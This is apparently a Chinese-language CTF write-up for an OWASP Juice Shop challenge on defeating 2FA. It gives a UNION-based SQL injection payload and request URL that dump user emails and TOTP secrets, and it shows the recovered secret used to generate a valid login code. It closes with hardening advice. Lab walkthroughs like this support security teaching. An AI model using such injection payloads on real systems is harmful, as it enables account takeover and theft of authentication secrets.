漏洞名称：2FA 绕过 / TOTP 密钥明文存储与泄露

1. 挑战概述
漏洞类别：身份验证破坏

挑战目标：在不禁用或覆盖后端设置的前提下，成功解开注重安全的用户 "wurstbrot" 的 2FA验证，成功登入其账号。

2. 漏洞发现线索与复现过程

双因素认证（2FA）通常采用基于时间的一次性密码（TOTP）。其核心逻辑是：服务器和用户的手机共享同一个“初始密钥”。如果开发人员在数据库中明文存储了这个初始密钥，一旦数据库被拖库，整个 2FA 防线将瞬间瓦解

1. 依旧是使用SQL注入，payload：')) union select 1,2,3,4,email,totpSecret,7,8,9 FROM USERS--
2. 访问http://127.0.0.1:3000/rest/products/search?q=%27))%20union%20select%201,2,3,4,email,totpSecret,7,8,9%20FROM%20USERS--
<img width="823" height="453" alt="截屏2026-11-12 02 40 40" src="https://github.com/user-attachments/assets/d165c297-45c9-4c82-a0b7-0be7d51a5d0e" />

3. 找到该用户与密钥：IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH
<img width="357" height="94" alt="截屏2026-11-12 02 40 19" src="https://github.com/user-attachments/assets/cbc66124-e1f6-46ec-bbf4-684105cf1765" />

4. 先使用SQL注入登入wurstbrot@juice-sh.op
<img width="314" height="228" alt="截屏2026-11-12 02 41 48" src="https://github.com/user-attachments/assets/43110392-6f67-49f6-977e-5e878c0de1b7" />

5. 发现需要二次验证，既然已获取密钥，找一个生成器生成一个有效的2FA即可
<img width="455" height="225" alt="截屏2026-11-12 02 44 35" src="https://github.com/user-attachments/assets/1fc60e66-4a79-4d30-af4e-45871c2df361" />

6。 然后输入验证码登入即可

<img width="260" height="105" alt="截屏2026-11-12 02 44 57" src="https://github.com/user-attachments/assets/6be91476-794a-4bbe-9bb9-5291f0be2fae" />


<img width="156" height="189" alt="截屏2026-11-12 02 45 05" src="https://github.com/user-attachments/assets/b9dac1d9-81b9-49b5-b13a-346b6e833d1e" />

3. 实战危害与加固建议
实战危害展示：
这道题揭示了企业安全建设中“木桶效应”的致命性。企业花费重金部署了 MFA，却在数据库里明文存储了 TOTP 种子密钥。一旦 Web 端存在任何一个可以拖库的 SQL 注入点、或者发生内部员工泄露，黑客就可以批量克隆所有高管的 Authenticator 身份。这意味着传统的“密码+手机物理隔离”的安全架构被彻底击穿，MFA 沦为虚设。

修复方案：
1. 强制加密敏感认证数据：绝不允许在数据库中明文存储 TOTP 密钥。必须使用高强度的对称加密算法对其进行加密存储，并将主密钥交由专门的 KMS妥善保管。
2. 纵深防御与异常风控：即使 2FA 验证码正确，后端风控引擎也应校验请求的 IP 归属地、设备指纹等上下文信息。如果发现一个来自海外的陌生设备突然正确输入了 2FA，应触发额外的二次人脸识别或紧急冻结。
